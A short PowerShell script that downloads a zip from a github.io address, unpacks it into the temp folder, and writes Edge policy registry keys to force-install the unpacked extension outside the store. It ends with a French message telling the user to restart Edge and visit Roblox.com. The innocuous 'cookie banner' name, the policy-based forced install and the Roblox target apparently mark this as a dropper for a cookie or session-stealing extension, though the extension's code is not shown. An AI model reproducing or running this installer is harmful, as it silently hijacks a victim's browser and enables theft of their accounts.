$url = "https://blaykow.github.io/CookieBannerExtension/extension.zip"
$dest = "$env:TEMP\CookieBannerExtension.zip"
$extract = "$env:TEMP\CookieBannerExtension"
$extId = "cookiebannerextension"

Invoke-WebRequest -Uri $url -OutFile $dest
Expand-Archive -Path $dest -DestinationPath $extract -Force

$regPath = "HKCU:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "1" -Value "$extId;file:///$extract/extension"

$srcPath = "HKCU:\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallSources"
New-Item -Path $srcPath -Force | Out-Null
Set-ItemProperty -Path $srcPath -Name "1" -Value "file:///$extract/extension"

Write-Host "Extension installee ! Redemarrez Edge et allez sur Roblox.com."
